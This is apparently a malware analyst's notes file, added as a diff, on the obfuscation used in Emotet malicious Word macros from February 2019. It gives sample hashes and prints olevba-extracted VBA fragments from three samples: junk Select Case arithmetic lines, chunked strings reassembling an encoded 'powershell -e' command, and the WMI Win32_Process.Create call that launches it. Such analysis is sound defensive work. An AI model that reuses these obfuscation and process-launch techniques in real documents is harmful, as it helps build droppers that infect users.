@@ -1,0 +1,186 @@
+https://paste.cryptolaemus.com/emotet/2019/02/22/emotet-malware-IoCs_02-22-19.html
+
+Variables are 6-7 chars in length, can be a-zA-Z0-9_
+
+concat to reassemble payload is 6-9 concats per line
+
+payload string broken up to 3-6 character chunks
+
+Garbage line examples. 2-3 between each legitimate line
+
+On Error Resume
+Next
+   Select Case i28839_9
+         Case 295330195
+w35_695 = (E4897__4 * Fix(933987790 / CBool(i1074_44))) - I_07415_ / Oct(175316490) / 802534161 + CStr(k978_17_) - 601088305 + ESC[91mChrBESC[39m(W__8__86)
+End Select
+   Select Case T048_6
+         Case 123926770
+R12194_ = (k_8___28 * Fix(576836159 / CBool(U146350_))) - a98__0_1 / Oct(962277199) / 900648578 + CStr(Q_9_9_) - 407868609 + ESC[91mChrBESC[39m(q0214__)
+End Select
+   Select Case l_9665_4
+         Case 268175503
+w112981_ = (C52891 * Fix(550412451 / CBool(v_6749))) - R20028 / Oct(651251203) / 271928447 + CStr(F477_380) - 660387921 + ESC[91mChrBESC[39m(o4684_39)
+End Select
+
+
+Real reassembly
+
+m_1_2_ = "rsheLl" + " -e J" + "ABq" + "ADMAMw" + "A5A" + "DQAX" + "wA9A" + "CgAJ"
+
+m7__0239 = "wB3AF8" + "AJwAr" + "ACcAN" + "wA2AF" + "8AMgA" + "nACsAJ" + "wBfAF8"
+
+Process create
+Function w_5024(p84753, h62078)
+Set U9814_2_ = GetObject(A_12_92 + v1991998 + U__5062)
+v1991998 = w5_34067 + "winmgmts:Win32" + Q_51_0_3 + "_ProcessStartup" + S72405
+U9814_2_.ShowWindow = G23_1_ + 952579 - 952579 + U9___08
+F29__4 = i_0_04_2 + "winmgmts:Win32" + i_16__ + "_Process" + z510_1
+M825_2_ = GetObject(l073__1 + F29__4 + L78059).Create((s064___ + p84753 + Q86977_ + F6_1_55 + K7_9413), m82_5009, U9814_2_, E_10_47_)
+
+Fix() lines:
+
+
+
+Select Case
+
+Select Case J40_9_
+   Select Case X8_4102
+Select Case D56642
+   Select Case C3_494_3
+   Select Case h_9209
+Select Case k73_8__7
+   Select Case n633176
+   Select Case H25__2
+Select Case v702690
+   Select Case O49_13__
+Select Case r15_64
+   Select Case W__060
+   Select Case Z_06__
+Select Case G19279__
+   Select Case i586_64_
+Select Case N_2_71
+   Select Case K9__89
+Select Case X23546_
+   Select Case m947_958
+   Select Case p_3_13_4
+Select Case n__1250_
+   Select Case q_67030
+   Select Case J1_2_5
+Select Case J8_7745
+   Select Case K_94_2
+   Select Case o98_648
+
+Case:
+
+     Case 959830793
+         Case 103576587
+         Case 876512307
+         Case 854358701
+         Case 282382032
+         Case 433888042
+         Case 967181065
+         Case 999171369
+         Case 971202815
+         Case 506855892
+         Case 852776780
+         Case 115441033
+         Case 115902488
+         Case 391807599
+         Case 673964650
+         Case 715226230
+         Case 193844113
+         Case 738599601
+         Case 538631717
+         Case 235082229
+         Case 724358386
+         Case 682801357
+         Case 249900544
+         Case 744955323
+         Case 981658248
+         Case 952319264
+         Case 873668674
+         Case 112145750
+         Case 95217891
+         Case 759454323
+         Case 481273436
+         Case 454116652
+         Case 222331638
+         Case 437139878
+         Case 380321868
+         Case 551972917
+         Case 999896793
+         Case 456615930
+         Case 494404399
+         Case 319205426
+         Case 349846937
+         Case 292330312
+         Case 601232089
+         Case 922319393
+         Case 386107910
+         Case 305941880
+         Case 837780841
+         Case 647108504
+         Case 118315380
+         Case 491873243
+         Case 652007310
+         Case 930755397
+         Case 622278617
+         Case 891210530
+         Case 890806412
+         Case 3775009
+         Case 706704372
+
+77acfcff5a71b198b7bcc4d5b458482bfcf13cdd1a6b3b37eb2517ea7fb8c35a
+046f87c718018b50c7c6f539d11492b8fa6e4325e3da77a64f6a702287e5c824
+ff020ce959d59d8464bb203470babf7b9b201f0287e0a01587a1c766819455cc
+
+77ac.olevba:S04___.ShowWindow = f_550386 + 717454 - 717454 + m0382_7
+846f.olevba:Z1790_07.ShowWindow = O_9_556 + 73271 - 73271 + J66_38
+ff02.olevba:U9814_2_.ShowWindow = G23_1_ + 952579 - 952579 + U9___08
+
+77ac.olevba:l0_1__ Y96_10 + "powe" + I52_31 + L_8_993_ + A_779_ + z04__6 + c834490_ + B_33_0_ + z362_579 + c59_13_7 + B_2723_ + i88872_1, r_1465 + c3___60 + a9_603_
+846f.olevba:j__020 X040379 + "powe" + d63677 + z58_2908 + J_362__ + i_2__9 + z_615_6 + V9_51_00 + S2976052 + O05_63_ + L0_2__25 + B12420_ + Y97_49 + K486380, o1_5696 + a_36_923 + R_37523
+ff02.olevba:w_5024 z__69__ + "powe" + R260077 + M4_61_ + j89_9_ + C8197_ + L_1_6_ + w4_8139 + F__868_1 + w62150 + k11_44, N7685_1 + j8___38 + q_545470 + R28_2728
+
+77ac.olevba:w94_41 = "rsheL" + "l -" + "e JAB" + "aADkAX" + "wBfAD"
+846f.olevba:U_40_4 = "rsheLl" + " -e J" + "ABX" + "ADcANA" + "BfAF8" + "ANQA" + "wAD0"
+ff02.olevba:m_1_2_ = "rsheLl" + " -e J" + "ABq" + "ADMAMw" + "A5A" + "DQAX" + "wA9A" + "CgAJ"
+
+77ac.olevba:i253_50_ = X159_269 + "winmgmts:Win32" + s47661 + "_ProcessStartup" + M2_65_
+846f.olevba:O1_161 = L10517 + "winmgmts:Win32" + "_ProcessStartup" + J597_154
+ff02.olevba:v1991998 = w5_34067 + "winmgmts:Win32" + Q_51_0_3 + "_ProcessStartup" + S72405
+
+77ac.olevba:j40_1__ = F965_0 + "winmgmts:Win32" + j373_5 + "_Process" + O_25_51
+846f.olevba:D76__47 = n065_5 + "winmgmts:Win32" + "_Process" + R_3_4_6
+ff02.olevba:F29__4 = i_0_04_2 + "winmgmts:Win32" + i_16__ + "_Process" + z510_1
+
+77ac.olevba:M4__9_7 = (n_09_113 * Fix(237213327 / CBool(l3386_20))) - I4_2_9_ / Oct(365202573) / 251948038 + CStr(S_3_66_) - 358443852 + ChrB(X7__1259)
+77ac.olevba:l7230682 = (p__9_7 * Fix(552349161 / CBool(f4_____9))) - C_7__3 / Oct(650875901) / 745484596 + CStr(r_99_1) - 29972076 + ChrB(X45700)
+77ac.olevba:i49_80 = (J8_418_ * Fix(928174828 / CBool(t85_594))) - G0405214 / Oct(441985149) / 161706374 + CStr(B67_4___) - 200113004 + ChrB(L5_4___1)
+846f.olevba:            a335_327 = Fix(571383260 + 219603384 + u67__4 - Oct(980013037))
+846f.olevba:            q02_8_8 = Fix(887055824 + 250168166 + C6391270 - Oct(839325539))
+846f.olevba:            h_47_22 = Fix(593716621 + 899057164 + W3__38 - Oct(822523561))
+ff02.olevba:P7945_ = (l__538 * Fix(686814843 / CBool(Z7960_9))) - h_9__2 / Oct(472587792) / 664872836 + CStr(S_4516) - 291702533 + ChrB(C_3_9_)
+ff02.olevba:o3585_4_ = (Q4___916 * Fix(68779480 / CBool(H7349_91))) - m__33__ / Oct(756626926) / 238428477 + CStr(F6175__) - 961230301 + ChrB(X__9_3)
+ff02.olevba:j9_385 = (c299___ * Fix(652907553 / CBool(z_9200))) - c632_2_4 / Oct(681703735) / 928044950 + CStr(L5_7_40) - 325859610 + ChrB(p08339)
+
+77ac.olevba:w94_41 = "rsheL" + "l -" + "e JAB" + "aADkAX" + "wBfAD"
+77ac.olevba:a180062 = "QAXwA" + "1AF" + "8APQAo" + "ACcAQw" + "A4ACcA" + "KwAnAF" + "8AM" + "gAyADA" + "AJw"
+77ac.olevba:J9735__4 = "ApAD" + "sAJ" + "ABo" + "AF8AX" + "wAwADg" + "AOAA"
+77ac.olevba:t4__77 = "9AG" + "4AZQB" + "3AC0Ab" + "wBi" + "AGoAZQ" + "BjAH" + "QAIAB" + "OAGUAd"
+77ac.olevba:v415353 = "AAuAFc" + "AZQBi" + "AEM" + "AbAB" + "pAGU" + "AbgB0"
+846f.olevba:O1_161 = L10517 + "winmgmts:Win32" + "_ProcessStartup" + J597_154
+846f.olevba:D76__47 = n065_5 + "winmgmts:Win32" + "_Process" + R_3_4_6
+846f.olevba:U_40_4 = "rsheLl" + " -e J" + "ABX" + "ADcANA" + "BfAF8" + "ANQA" + "wAD0"
+846f.olevba:h439311 = "AKAAnA" + "G4AN" + "wAyA" + "CcAKw" + "AnAF" + "8AMQ" + "AnA" + "CsAJw" + "A5ACcA"
+846f.olevba:N60__3_5 = "KQA7AC" + "QARg" + "BfA" + "DQAXw" + "A4AD" + "AAMg"
+ff02.olevba:m_1_2_ = "rsheLl" + " -e J" + "ABq" + "ADMAMw" + "A5A" + "DQAX" + "wA9A" + "CgAJ"
+ff02.olevba:m7__0239 = "wB3AF8" + "AJwAr" + "ACcAN" + "wA2AF" + "8AMgA" + "nACsAJ" + "wBfAF8"
+ff02.olevba:b5_598 = "AJw" + "ApADs" + "AJA" + "BkAF8" + "AMwA4A" + "DAA"
+ff02.olevba:k45__1 = "OAAxAD" + "gAPQB" + "uAGUAd" + "wAtAG8" + "AYgBq" + "AGUAYw" + "B0AC" + "AATgBl"
+ff02.olevba:O5938___ = "AHQ" + "ALg" + "BXAGUA" + "YgBD" + "AGwAa" + "QBlAG" + "4AdA"
+
+77ac.olevba:o2_34_2_ = GetObject(r098_70 + j40_1__ + E2_079).Create((z31563 + o7_572_ + X69103_3 + B692634 + s7_05__ + X879459), w0_330, S04___, j33753)
+846f.olevba:S__2953 = GetObject(C2_0_81 + D76__47 + H20_560_).Create((E56065 + Q1719__3 + E31_6_26 + i_8__6_6 + j31_197 + r5__225), C58685, Z1790_07, q_51130)
+ff02.olevba:M825_2_ = GetObject(l073__1 + F29__4 + L78059).Create((s064___ + p84753 + Q86977_ + F6_1_55 + K7_9413), m82_5009, U9814_2_, E_10_47_)
